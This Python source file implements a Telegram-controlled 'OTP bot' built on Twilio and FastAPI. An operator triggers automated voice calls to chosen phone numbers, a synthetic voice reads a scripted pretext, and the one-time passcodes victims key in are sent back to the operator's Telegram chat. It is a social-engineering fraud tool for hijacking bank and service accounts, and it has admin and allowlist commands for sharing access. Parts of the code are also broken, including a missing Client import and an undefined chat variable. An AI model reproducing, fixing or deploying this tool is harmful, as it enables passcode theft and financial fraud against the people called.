from fastapi import FastAPI, Form, Request
from twilio.twiml.voice_response import Gather, VoiceResponse
import telegram
from telegram import Update
from telegram.ext import Updater, CommandHandler, MessageHandler, Filters, CallbackContext

app = FastAPI()

# Replace with your Twilio Account SID and Auth Token
account_sid = 'your_account_sid'
auth_token = 'your_auth_token'

# Set up the Telegram bot
telegram_bot_token = 'your_telegram_bot_token'
bot = telegram.Bot(token=telegram_bot_token)

# Define the admin chat ID
admin_chat_id = 'your_admin_chat_id'

# List of allowed chat IDs
allowed_chat_ids = []

# List of authenticated user chat IDs
authenticated_user_chat_ids = []

# Dictionary to store services and their text content
services_dict = {}

# Twilio client initialization
client = Client(account_sid, auth_token)

def make_call(to_number, service_name, otp_digits):
    if service_name in services_dict:
        text_to_speak = services_dict[service_name]
    else:
        text_to_speak = "Service not found."

    twiml_response = VoiceResponse()
    twiml_response.say(text_to_speak, voice='Polly.Joanna')  # Using a girl's voice for Polly.Joanna

    gather = Gather(numDigits=otp_digits, action="/handle_user_input")
    twiml_response.append(gather)

    call = client.calls.create(
        to=to_number,
        from_='your_twilio_phone_number',
        twiml=str(twiml_response)
    )

    return {"message": "Call initiated! 📞"}

@app.post("/twilio_callback")
async def twilio_callback(request: Request, text_to_speak: str = None, otp_digits: int = None):
    return {"message": "Twilio callback received!"}

@app.post("/handle_user_input")
async def handle_user_input(Digits: str = Form(...)):
    bot.send_message(chat_id=user_chat_id, text=f"User input received: {Digits} ✅")
    return {"message": "User input received! ✅"}

# Telegram bot handlers
def start(update: Update, context: CallbackContext):
    introduction_message = (
        "🔥🔥🔥🔥 ALPHA OTP BOT 🔥🔥🔥🔥\n\n"
        "📲 Call Command\n\n"
        "Use /call <phone_number> <service_name> <otp_digits> to initiate a call with a specific service's text to speak "
        "and OTP input length.\n\n"
        "👑 Admin Command\n\n"
        "🔑 》 /addchatid - Add allowed chat ID (admin only)\n\n"
        "🔑 》 /authenticate <chat_id> - Authenticate user by chat ID\n\n"
        "🔑 》 /addService <text> <service_name> - Add a new service\n\n"
        "🔑 》 /updateService <service_name> <new_text> - Update existing service"
    )
    update.message.reply_text(introduction_message)

def authenticate_user(update: Update, context: CallbackContext):
    user_chat_id = update.message.chat_id
    if str(user_chat_id) == admin_chat_id:
        update.message.reply_text("Admin cannot be authenticated.")
        return

    args = context.args
    if len(args) != 1:
        update.message.reply_text("Usage: /authenticate <chat_id>")
        return

    chat_id_to_authenticate = args[0]
    if chat_id_to_authenticate == str(user_chat_id):
        authenticated_user_chat_ids.append(str(user_chat_id))
        update.message.reply_text("You are now authenticated! You can use the bot's features. ✅")
    else:
        update.message.reply_text("Authentication failed. Please use your own chat ID.")

def add_service(update: Update, context: CallbackContext):
    args = context.args
    if len(args) != 2:
        update.message.reply_text("Usage: /addService <text> <service_name>")
        return
    text, service_name = args
    services_dict[service_name] = text
    update.message.reply_text(f"Service '{service_name}' has been added with text: {text}")

def update_service(update: Update, context: CallbackContext):
    args = context.args
    if len(args) != 2:
        update.message.reply_text("Usage: /updateService <service_name> <new_text>")
        return
    service_name, new_text = args
    if service_name in services_dict:
        services_dict[service_name] = new_text
        update.message.reply_text(f"Service '{service_name}' has been updated with new text: {new_text}")
    else:
        update.message.reply_text(f"Service '{service_name}' does not exist.")

def make_custom_call(update: Update, context: CallbackContext):
    args = context.args
    if len(args) != 3:
        update.message.reply_text("Usage: /call <phone_number> <service_name> <otp_digits> 📞")
    else:
        phone_number, service_name, otp_digits = args
        if service_name in services_dict:
            make_call(phone_number, service_name, int(otp_digits))
            update.message.reply_text(f"Call initiated with service '{service_name}' and OTP input of {otp_digits} digits! 📞")
        else:
            update.message.reply_text(f"Service '{service_name}' does not exist.")

def add_chat_id(update: Update, context: CallbackContext):
    if str(update.message.chat_id) == admin_chat_id:
        args = context.args
        if len(args) != 1:
            update.message.reply_text("Usage: /addchatid <chat_id>")
            return
        new_chat_id = args[0]
        allowed_chat_ids.append(new_chat_id)
        update.message.reply_text(f"Chat ID {new_chat_id} has been added to the allowed list.")
    else:
        update.message.reply_text("Access denied. Only the admin can use this command.")

# Set up the Telegram bot
updater = Updater(token=telegram_bot_token, use_context=True)
dispatcher = updater.dispatcher

dispatcher.add_handler(CommandHandler("start", start))
dispatcher.add_handler(CommandHandler("authenticate", authenticate_user, pass_args=True))
dispatcher.add_handler(CommandHandler("make", make_custom_call))
dispatcher.add_handler(CommandHandler("addchatid", add_chat_id))
dispatcher.add_handler(CommandHandler("addService", add_service, pass_args=True))
dispatcher.add_handler(CommandHandler("updateService", update_service, pass_args=True))

# Start  bot
updater.start_polling()
